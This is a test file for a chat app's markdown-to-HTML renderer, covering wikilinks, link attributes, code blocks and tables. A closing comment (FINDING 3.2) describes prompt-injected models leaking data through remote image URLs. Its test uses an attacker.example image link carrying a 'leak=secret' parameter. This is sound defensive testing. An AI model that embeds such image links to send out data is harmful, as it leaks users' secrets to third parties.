import { describe, expect, test } from "vitest";
import {
  normalizeMessageMarkdown,
  renderMessageMarkdownToHtml,
} from "../../../src/chat/rendering/messageMarkdown";

describe("normalizeMessageMarkdown", () => {
  test("normalizes newlines without altering content", () => {
    expect(normalizeMessageMarkdown("A\r\n\u200B```md\r\ntext\r\n```"))
      .toBe("A\n\u200B```md\ntext\n```");
  });
});

describe("renderMessageMarkdownToHtml", () => {
  test("adds safe attributes to rendered links", () => {
    const html = renderMessageMarkdownToHtml("[Docs](https://example.com)");

    expect(html).toContain('data-lmsa-link-href="https://example.com"');
    expect(html).toContain('rel="nofollow"');
  });

  // The two custom inline rules poke StateInline directly (src, pos, posMax, push), the
  // surface most exposed to a markdown-it major. Pinned here so a future bump fails loudly
  // rather than silently dropping wikilink support.
  test("renders a wikilink as an internal link with an encoded href", () => {
    const html = renderMessageMarkdownToHtml("[[Some Note]]");

    expect(html).toContain('href="Some%20Note"');
    expect(html).toContain('data-lmsa-link-href="Some%20Note"');
    expect(html).toContain(">Some Note</a>");
  });

  test("uses the pipe label and keeps a heading anchor in a wikilink", () => {
    expect(renderMessageMarkdownToHtml("[[folder/Some Note|Display label]]")).toContain(
      '<a href="folder/Some%20Note" data-lmsa-link-href="folder/Some%20Note" rel="nofollow">Display label</a>'
    );
    expect(renderMessageMarkdownToHtml("[[Note#heading|Label]]")).toContain(
      'href="Note#heading"'
    );
  });

  test("rewrites a relative markdown link into an internal link", () => {
    const html = renderMessageMarkdownToHtml("see [[A]] and [b](c.md) inline");

    expect(html).toContain('<a href="A" data-lmsa-link-href="A" rel="nofollow">A</a>');
    expect(html).toContain('<a href="c.md" data-lmsa-link-href="c.md" rel="nofollow">b</a>');
  });

  test("renders fenced code blocks with chat chrome", () => {
    const html = renderMessageMarkdownToHtml("```ts\nconst value = 1;\n```");

    expect(html).toContain('class="lmsa-md-codeblock"');
    expect(html).toContain('class="lmsa-md-codeblock-language">ts<');
    expect(html).toContain("const value = 1;");
  });

  test("wraps tables for horizontal scrolling", () => {
    const html = renderMessageMarkdownToHtml("| A | B |\n| --- | --- |\n| 1 | 2 |");

    expect(html).toContain('class="lmsa-md-table-wrap"');
    expect(html).toContain("<table>");
  });

  // FINDING 3.2: markdown-it's image rule renders remote / data:image sources into a live
  // <img>, which the Electron renderer fetches, an out-of-band exfiltration / tracking
  // pixel channel for a prompt-injected model. No image element should reach the DOM.
  test("does not emit a live <img> for a remote image source", () => {
    const html = renderMessageMarkdownToHtml("![](https://attacker.example/pixel.png?leak=secret)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });

  test("does not emit a live <img> for a data:image source", () => {
    const html = renderMessageMarkdownToHtml(
      "![alt](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGMAAQAABQAB)",
    );

    expect(html).not.toContain("<img");
  });
});
